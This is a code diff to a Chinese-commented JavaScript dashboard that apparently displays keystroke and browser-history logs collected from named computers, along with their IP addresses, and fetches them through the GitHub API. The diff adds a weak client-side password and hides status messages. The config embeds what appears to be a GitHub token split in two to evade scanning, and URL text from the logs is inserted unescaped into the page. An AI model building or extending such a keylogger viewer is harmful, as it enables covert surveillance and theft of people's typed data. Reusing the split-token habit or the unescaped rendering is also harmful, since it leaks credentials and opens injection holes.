@@ -10,22 +10,45 @@ const CONFIG = {
         'Authorization': 'Bearer ghp_VYuzgVnERDLA' + 'MHUf58iqBVxPBWRvxY1ALCuI',
         'Accept': 'application/vnd.github.v3+json',
         'X-GitHub-Api-Version': '2022-11-28'
-    }
+    },
+    password: '1222' // 添加密碼配置
 };
 
 // 全局變量
 let allLogs = [];
 let ipAddresses = new Set();
 
+// 密碼驗證功能
+function checkPassword() {
+    const password = document.getElementById('passwordInput').value;
+    if (password === CONFIG.password) {
+        document.getElementById('passwordOverlay').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+        loadLogs(); // 加載日誌
+    } else {
+        alert('密碼錯誤！');
+        document.getElementById('passwordInput').value = '';
+    }
+}
+
+// 添加回車鍵監聽
+document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        checkPassword();
+    }
+});
+
+// 防止未驗證訪問
+window.onload = function() {
+    if (document.getElementById('passwordOverlay').style.display === 'none') {
+        location.reload();
+    }
+};
+
 // 顯示狀態消息
-function showStatus(message, isError = false) {
-    const status = document.getElementById('status');
-    status.textContent = message;
-    status.className = `status ${isError ? 'error' : 'success'}`;
-    status.style.display = 'block';
-    setTimeout(() => {
-        status.style.display = 'none';
-    }, 3000);
+function showStatus(message, type = 'success') {
+    // 不顯示任何狀態消息
+    return;
 }
 
 // 解碼 Base64 內容
@@ -151,76 +174,64 @@ function filterLogs() {
 
 // 顯示日誌
 function displayLogs(logs) {
-    const logsContainer = document.getElementById('logs');
-    logsContainer.innerHTML = '';
+    const logContainer = document.getElementById('logs');
+    if (!logContainer) return;
     
-    if (logs.length === 0) {
-        logsContainer.innerHTML = `
-            <div class="log-entry">
-                <div class="text-content">暫無記錄</div>
-            </div>
-        `;
+    logContainer.innerHTML = '';
+    
+    if (!logs || logs.length === 0) {
         return;
     }
-    
-    // 先按電腦名稱排序，然後按時間排序
-    logs.sort((a, b) => {
-        const computerA = a.computer_name || '未知電腦';
-        const computerB = b.computer_name || '未知電腦';
-        
-        // 先按電腦名稱排序
-        if (computerA < computerB) return -1;
-        if (computerA > computerB) return 1;
-        
-        // 如果電腦名稱相同，則按時間倒序排序
-        return new Date(b.timestamp) - new Date(a.timestamp);
-    });
-    
+
+    // 按時間戳排序
+    logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
     logs.forEach(log => {
+        if (!log || typeof log !== 'object') return;
+
         const logEntry = document.createElement('div');
         logEntry.className = 'log-entry';
         
-        // 獲取基本信息
-        const isBrowserLog = log.browser_history === true;
-        const timestamp = new Date(log.timestamp).toLocaleTimeString('zh-TW');
-        const date = new Date(log.timestamp).toLocaleDateString('zh-TW', {
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit'
-        });
+        // 判斷記錄類型
+        const logText = log.text || log.display_text || '';
+        const isBrowser = logText.includes('browser_history') || /https?:\/\/[^\s]+/.test(logText) || log.browser_history === true;
+        logEntry.setAttribute('data-type', isBrowser ? 'browser' : 'keyboard');
+
+        // 創建記錄頭部
+        const logHeader = document.createElement('div');
+        logHeader.className = 'log-header';
         
-        // 準備IP信息顯示
-        let ipInfoText = '';
-        if (log.ip_info) {
-            const parts = [];
-            if (log.ip_info.public_ip) {
-                parts.push(`${log.ip_info.public_ip}`);
-            }
-            if (Array.isArray(log.ip_info.local_ips) && log.ip_info.local_ips.length > 0) {
-                parts.push(`${log.ip_info.local_ips.join(', ')}`);
-            }
-            ipInfoText = parts.length > 0 ? parts.join(' | ') : '無IP信息';
+        // 添加電腦名稱
+        const computerName = document.createElement('span');
+        computerName.className = 'computer-name';
+        computerName.textContent = log.computer_name || '未知電腦';
+        logHeader.appendChild(computerName);
+        
+        // 添加時間戳
+        const timestamp = document.createElement('span');
+        timestamp.className = 'timestamp';
+        timestamp.textContent = new Date(log.timestamp || new Date()).toLocaleString();
+        logHeader.appendChild(timestamp);
+        
+        logEntry.appendChild(logHeader);
+
+        // 創建記錄內容
+        const textContent = document.createElement('div');
+        textContent.className = 'text-content';
+        
+        // 如果是瀏覽器記錄，將URL轉換為可點擊的連結
+        if (isBrowser) {
+            const urlRegex = /(https?:\/\/[^\s]+)/g;
+            const text = logText.replace(urlRegex, url => {
+                return `<a href="${url}" target="_blank" rel="noopener noreferrer">${url}</a>`;
+            });
+            textContent.innerHTML = text;
         } else {
-            ipInfoText = '無IP信息';
+            textContent.textContent = logText;
         }
         
-        // 準備內容
-        const icon = isBrowserLog ? '🌐' : '⌨️';
-        const computerName = log.computer_name || '未知電腦';
-        
-        // 組合顯示內容
-        logEntry.innerHTML = `
-            <div class="log-header">
-                <span class="computer-name">${computerName}</span>
-                <span class="timestamp">${icon} ${date} ${timestamp}</span>
-            </div>
-            <div class="log-body">
-                <div class="ip-info">IP: ${ipInfoText}</div>
-                <div class="text-content">${log.display_text}</div>
-            </div>
-        `;
-        
-        logsContainer.appendChild(logEntry);
+        logEntry.appendChild(textContent);
+        logContainer.appendChild(logEntry);
     });
 }
 
